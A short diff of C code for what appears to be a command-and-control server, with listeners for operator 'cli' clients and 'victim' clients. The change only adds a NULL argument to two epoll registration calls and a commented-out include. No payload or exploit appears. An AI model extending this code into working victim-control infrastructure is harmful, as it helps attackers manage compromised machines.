@@ -8,6 +8,7 @@
 #include <arpa/inet.h>
 
 #include "server.h"
+//#include "netwerking.h"
 
 /* Global Vars */
 struct commandServer server; /* Server global state  */
@@ -70,13 +71,13 @@ void initServer(void){
         /* Add client socket fd to epoll - handle connecting cli clients */
         int j;
         for(j=0; j < server.clifd_count; j++) {
-               if (addEpollEvent(server.event_loop, server.clifd[j], EVENT_READ, handleCliAccept) == EVENT_ERR)                  
+               if (addEpollEvent(server.event_loop, server.clifd[j], EVENT_READ, handleCliAccept, NULL) == EVENT_ERR)                  
                         perror("createEpollFileEvent");
         }
         
         /* Add victim socket fd to epoll - handle connecting victim clients */
         for(j=0; j < server.victimfd_count; j++) {
-               if (addEpollEvent(server.event_loop, server.victimfd[j], EVENT_READ, handleVictimAccept) == EVENT_ERR)                  
+               if (addEpollEvent(server.event_loop, server.victimfd[j], EVENT_READ, handleVictimAccept, NULL) == EVENT_ERR)                  
                         perror("createEpollFileEvent");
         }
 
